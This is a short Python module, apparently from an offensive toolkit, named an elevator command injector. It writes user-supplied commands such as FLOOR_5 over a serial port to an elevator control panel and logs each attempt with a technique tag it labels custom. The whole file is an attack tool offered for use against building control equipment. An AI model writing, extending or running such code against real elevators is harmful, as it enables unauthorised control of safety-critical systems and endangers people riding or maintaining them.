# modules/exploits/elevator_command_injector.py

import argparse
import serial
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0850"  # Control Device via Serial Protocol (custom)

def log_elevator(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def inject_elevator_cmd(port, command):
    try:
        with serial.Serial(port, 9600, timeout=1) as ser:
            ser.write(command.encode())
            print(f"[âœ“] Sent elevator command: {command}")
    except Exception as e:
        print(f"[!] Elevator command failed: {e}")

    log_elevator({
        "timestamp": datetime.utcnow().isoformat(),
        "port": port,
        "command": command,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Elevator Panel Command Injector")
    parser.add_argument("--port", required=True, help="Serial port (e.g., /dev/ttyUSB0)")
    parser.add_argument("--cmd", required=True, help="Command to send (e.g., FLOOR_5)")
    args = parser.parse_args()

    inject_elevator_cmd(args.port, args.cmd)
